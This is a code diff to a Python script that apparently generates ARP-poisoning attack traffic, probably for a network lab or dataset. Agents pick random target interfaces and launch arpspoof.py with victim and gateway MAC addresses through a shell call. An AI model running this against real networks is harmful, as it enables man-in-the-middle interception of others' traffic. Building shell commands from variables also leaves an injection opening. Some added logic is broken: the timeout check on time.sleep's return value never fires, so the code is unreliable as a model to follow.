@@ -46,18 +46,12 @@ def execute_code(agent_id, target_interface): # ARP-poison script: https://githu
         end_time = datetime.now() + timedelta(minutes=duration)
 
 
-        command = ['python3 arpspoof.py',
-            targetip, 
-            '-i', agent_name,
-            '--attackermac', agent_interface_mac,
-            '--targetmac', targetmac, 
-            '--gatewaymac DE:BC:50:A7:AD:9E'
-            ' -f'
-        ]
+        command = [f'python3 arpspoof.py  --targetip {targetip} -i {agent_name} --attackermac {agent_interface_mac} --targetmac {targetmac} --gatewaymac DE:BC:50:A7:AD:9E -f']
 
 
         try:
             print(f"Agent {agent_name} is running the following command: {' '.join(command)}")
+            print(datetime.now())
             process = subprocess.Popen(command, shell=True)
         except subprocess.CalledProcessError as e:
             print(f"Agent {agent_name} failed to execute the command: {' '.join(command)}")
@@ -74,12 +68,11 @@ def execute_code(agent_id, target_interface): # ARP-poison script: https://githu
 
 # Function to run an agent
 def run_agent(agent_id):
-
-    # Introduce a random delay before starting each agent
-    # random_start_delay = random.uniform(120, 240)  # Random delay between 2 to 4 minutes
-    # time.sleep(random_start_delay)
-
     while True:
+        # Introduce a random delay before starting each agent
+        random_start_delay = random.uniform(120, 240)  # Random delay between 2 to 4 minutes
+        time.sleep(random_start_delay)
+
         # Choose a random target interface
         target_interface = random.choice(TARGET_INTERFACES)
 
@@ -104,6 +97,9 @@ def main():
     try:
         # Run the agents for an hour
         time.sleep(60 * 60)
+        if time.sleep(60 * 60):
+            print("Time's up! Stopping agents...")
+            sys.exit()
     except KeyboardInterrupt:
         print("\nReceived KeyboardInterrupt. Stopping agents...")
         sys.exit()
